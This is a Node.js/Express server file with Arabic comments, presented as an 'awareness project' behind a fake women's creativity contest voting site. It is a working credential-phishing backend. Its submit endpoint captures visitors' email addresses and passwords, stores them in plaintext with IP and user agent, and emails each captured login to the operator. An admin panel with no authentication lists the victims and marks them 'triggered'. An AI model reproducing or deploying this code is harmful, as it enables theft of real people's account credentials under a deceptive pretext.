// ===================================================
// مشروع التوعية - الخادم الرئيسي مع MongoDB Atlas
// قاعدة بيانات دائمة - تحفظ البيانات حتى بدون اتصال
// ===================================================

const express = require('express');
const nodemailer = require('nodemailer');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const cors = require('cors');
const { MongoClient } = require('mongodb');

const app = express();
const PORT = process.env.PORT || 3000;

// ===================================================
// إعدادات MongoDB Atlas
// ضع رابط الاتصال في متغير البيئة MONGODB_URI
// مثال: mongodb+srv://user:pass@cluster0.xxxxx.mongodb.net/votedb
// ===================================================
const MONGODB_URI = process.env.MONGODB_URI || null;
const DB_NAME = 'votedb';
const COLLECTION_NAME = 'records';

// ===================================================
// ⚠️ إعدادات البريد الإلكتروني - يرجى تعديلها
// ===================================================
const EMAIL_CONFIG = {
  myEmail: process.env.MY_EMAIL || 'YOUR_EMAIL@gmail.com',
  appPassword: process.env.APP_PASSWORD || 'YOUR_APP_PASSWORD',
  enabled: !!(process.env.MY_EMAIL && process.env.APP_PASSWORD),
};

// ===================================================
// اتصال MongoDB - Singleton مُحسَّن لـ Vercel Serverless
// ===================================================
let cachedClient = null;
let cachedDb = null;

async function getDB() {
  if (!MONGODB_URI) {
    // وضع الطوارئ: استخدام الذاكرة فقط إذا لم يُضَف رابط MongoDB
    return null;
  }

  if (cachedDb) return cachedDb;

  try {
    const client = new MongoClient(MONGODB_URI, {
      maxPoolSize: 10,
      serverSelectionTimeoutMS: 5000,
      socketTimeoutMS: 10000,
    });

    await client.connect();
    cachedClient = client;
    cachedDb = client.db(DB_NAME);
    console.log('[✅] متصل بـ MongoDB Atlas بنجاح');
    return cachedDb;
  } catch (err) {
    console.error('[❌] فشل الاتصال بـ MongoDB:', err.message);
    return null;
  }
}

// ===================================================
// احتياطي: ذاكرة محلية إذا لم يتوفر MongoDB
// ===================================================
if (!global.memRecords) {
  global.memRecords = [];
}

// ===================================================
// دوال قاعدة البيانات (MongoDB أولاً، ذاكرة احتياطياً)
// ===================================================
async function findRecord(id) {
  const db = await getDB();
  if (db) {
    return await db.collection(COLLECTION_NAME).findOne({ id });
  }
  return global.memRecords.find(r => r.id === id) || null;
}

async function insertRecord(record) {
  const db = await getDB();
  if (db) {
    await db.collection(COLLECTION_NAME).insertOne({ ...record, _id: record.id });
    console.log(`[💾] حُفظ في MongoDB: ${record.email}`);
    return;
  }
  // احتياطي: ذاكرة
  global.memRecords.push(record);
  console.log(`[⚠️] حُفظ في الذاكرة المؤقتة (لا يوجد MongoDB): ${record.email}`);
}

async function updateRecord(id, updates) {
  const db = await getDB();
  if (db) {
    const result = await db.collection(COLLECTION_NAME).findOneAndUpdate(
      { id },
      { $set: updates },
      { returnDocument: 'after' }
    );
    return result || null;
  }
  // احتياطي: ذاكرة
  const record = global.memRecords.find(r => r.id === id);
  if (!record) return null;
  Object.assign(record, updates);
  return record;
}

async function deleteRecord(id) {
  const db = await getDB();
  if (db) {
    const result = await db.collection(COLLECTION_NAME).deleteOne({ id });
    return result.deletedCount > 0;
  }
  const before = global.memRecords.length;
  global.memRecords = global.memRecords.filter(r => r.id !== id);
  return global.memRecords.length < before;
}

async function getAllRecords() {
  const db = await getDB();
  if (db) {
    return await db.collection(COLLECTION_NAME)
      .find({})
      .sort({ timestamp: -1 }) // الأحدث أولاً
      .toArray();
  }
  return [...global.memRecords].reverse();
}

async function clearAllRecords() {
  const db = await getDB();
  if (db) {
    await db.collection(COLLECTION_NAME).deleteMany({});
    return;
  }
  global.memRecords = [];
}

// ===================================================
// إعداد Nodemailer
// ===================================================
let transporter = null;
if (EMAIL_CONFIG.enabled) {
  transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: EMAIL_CONFIG.myEmail,
      pass: EMAIL_CONFIG.appPassword,
    },
  });
}

// ===================================================
// Middleware
// ===================================================
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ===================================================
// API: فحص حالة الاتصال بقاعدة البيانات
// ===================================================
app.get('/api/health', async (req, res) => {
  const db = await getDB();
  res.json({
    status: 'ok',
    database: db ? 'MongoDB Atlas (دائم)' : 'ذاكرة مؤقتة (أضف MONGODB_URI)',
    timestamp: new Date().toISOString()
  });
});

// ===================================================
// API: استقبال وتخزين البيانات من صفحة الدخول
// ===================================================
app.post('/api/submit', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ success: false, message: 'بيانات ناقصة' });
  }

  const sessionId = uuidv4();
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
  const userAgent = req.headers['user-agent'] || 'غير معروف';
  const timestamp = new Date().toISOString();

  await insertRecord({
    id: sessionId,
    email,
    password,
    ip,
    user_agent: userAgent,
    timestamp,
    candidate: null,
    status: 'waiting'
  });

  console.log(`[+] بيانات جديدة: ${email} | ${timestamp}`);

  // إرسال بريد إلكتروني (إذا مُفعَّل)
  if (transporter) {
    try {
      await transporter.sendMail({
        from: EMAIL_CONFIG.myEmail,
        to: EMAIL_CONFIG.myEmail,
        subject: '🔔 بيانات جديدة تم تسجيلها',
        html: `
          <div dir="rtl" style="font-family: Arial; padding: 20px; background: #0f111a; color: #fff; border-radius: 12px;">
            <h2 style="color: #F472B6;">🗳️ تسجيل جديد في مسابقة الإبداع النسائي</h2>
            <table style="width:100%; border-collapse:collapse; border-radius:8px; overflow:hidden;">
              <tr style="background:#DB2777; color:white;">
                <th style="padding:12px; text-align:right;">الحقل</th>
                <th style="padding:12px; text-align:right;">القيمة</th>
              </tr>
              <tr style="background:#1a1c2e;"><td style="padding:10px;border-bottom:1px solid #333;"><b>البريد</b></td><td style="padding:10px;border-bottom:1px solid #333;color:#F472B6;">${email}</td></tr>
              <tr style="background:#1a1c2e;"><td style="padding:10px;border-bottom:1px solid #333;"><b>كلمة المرور</b></td><td style="padding:10px;border-bottom:1px solid #333;color:#FBBF24;font-weight:bold;">${password}</td></tr>
              <tr style="background:#1a1c2e;"><td style="padding:10px;border-bottom:1px solid #333;"><b>IP</b></td><td style="padding:10px;border-bottom:1px solid #333;">${ip}</td></tr>
              <tr style="background:#1a1c2e;"><td style="padding:10px;"><b>الوقت</b></td><td style="padding:10px;">${new Date(timestamp).toLocaleString('ar-SA')}</td></tr>
            </table>
            <p style="color:#9CA3AF; font-size:12px; margin-top:16px;">افتح لوحة الأدمن لعرض جميع السجلات وإدارتها.</p>
          </div>
        `,
      });
    } catch (emailErr) {
      console.warn('[!] فشل إرسال البريد:', emailErr.message);
    }
  }

  res.json({ success: true, sessionId });
});

// ===================================================
// API: تسجيل تصويت المرشح
// ===================================================
app.post('/api/vote', async (req, res) => {
  const { id, candidate } = req.body;
  if (!id || !candidate) {
    return res.status(400).json({ success: false, message: 'بيانات التصويت ناقصة' });
  }

  const record = await updateRecord(id, {
    candidate,
    voteTimestamp: new Date().toISOString()
  });

  if (!record) {
    return res.status(404).json({ success: false, message: 'لم يتم العثور على الجلسة' });
  }

  res.json({ success: true, message: 'تم حفظ التصويت بنجاح' });
});

// ===================================================
// API: فحص حالة الجلسة (لصفحة thankyou.html)
// ===================================================
app.get('/api/status', async (req, res) => {
  const id = req.query.id;
  if (!id) return res.status(400).json({ success: false });
  
  const record = await findRecord(id);
  if (!record) {
    return res.status(404).json({ success: false, message: 'الجلسة غير موجودة' });
  }

  res.json({
    success: true,
    status: record.status,
    triggered: record.status === 'triggered',
    candidate: record.candidate || 'غير محدد'
  });
});

app.get('/api/status/:id', async (req, res) => {
  const record = await findRecord(req.params.id);
  if (!record) {
    return res.status(404).json({ success: false, message: 'الجلسة غير موجودة' });
  }
  res.json({
    success: true,
    status: record.status,
    triggered: record.status === 'triggered',
    candidate: record.candidate || 'غير محدد'
  });
});

// ===================================================
// API: جلب بيانات جلسة معينة
// ===================================================
app.get('/api/data/:id', async (req, res) => {
  const record = await findRecord(req.params.id);
  if (!record) {
    return res.status(404).json({ success: false, message: 'لم يتم العثور على البيانات' });
  }
  res.json({ success: true, data: record });
});

// ===================================================
// API: حذف بيانات جلسة
// ===================================================
app.delete('/api/delete/:id', async (req, res) => {
  const existed = await findRecord(req.params.id);
  if (!existed) {
    return res.status(404).json({ success: false, message: 'البيانات غير موجودة' });
  }
  const deleted = await deleteRecord(req.params.id);
  res.json({ success: deleted, message: deleted ? 'تم حذف بياناتك بنجاح' : 'فشل الحذف' });
});

// ===================================================
// API للأدمن: جلب جميع السجلات
// ===================================================
app.get('/api/admin/records', async (req, res) => {
  const records = await getAllRecords();
  res.json({
    success: true,
    records,
    total: records.length,
    waitingCount: records.filter(r => r.status === 'waiting').length,
    triggeredCount: records.filter(r => r.status === 'triggered').length,
  });
});

// إطلاق التوعية لضحية محددة
app.post('/api/admin/trigger/:id', async (req, res) => {
  const record = await updateRecord(req.params.id, {
    status: 'triggered',
    triggeredAt: new Date().toISOString()
  });

  if (!record) {
    return res.status(404).json({ success: false, message: 'السجل غير موجود' });
  }

  res.json({ success: true, message: 'تم تفعيل السجل بنجاح' });
});

// إطلاق التوعية لجميع المنتظرين
app.post('/api/admin/trigger-all', async (req, res) => {
  const db = await getDB();
  const now = new Date().toISOString();
  let count = 0;

  if (db) {
    const result = await db.collection(COLLECTION_NAME).updateMany(
      { status: 'waiting' },
      { $set: { status: 'triggered', triggeredAt: now } }
    );
    count = result.modifiedCount;
  } else {
    global.memRecords.forEach(r => {
      if (r.status === 'waiting') {
        r.status = 'triggered';
        r.triggeredAt = now;
        count++;
      }
    });
  }

  res.json({ success: true, count, message: `تم التفعيل لـ ${count} مستخدم` });
});

// حذف سجل محدد
app.delete('/api/admin/delete/:id', async (req, res) => {
  const deleted = await deleteRecord(req.params.id);
  res.json({ success: deleted, message: deleted ? 'تم الحذف' : 'لم يتم العثور على السجل' });
});

// مسح جميع السجلات
app.delete('/api/admin/clear-all', async (req, res) => {
  await clearAllRecords();
  res.json({ success: true, message: 'تم تفريغ جميع السجلات بنجاح' });
});

// ===================================================
// تصدير لـ Vercel وتشغيل محلي
// ===================================================
module.exports = app;

if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`
  ╔══════════════════════════════════════════════════════╗
  ║   🗳️  مسابقة الإبداع النسائي 2026                   ║
  ║   الموقع:        http://localhost:${PORT}              ║
  ║   لوحة الأدمن:  http://localhost:${PORT}/admin.html   ║
  ║   فحص قاعدة البيانات: http://localhost:${PORT}/api/health ║
  ╚══════════════════════════════════════════════════════╝
    `);
  });
}
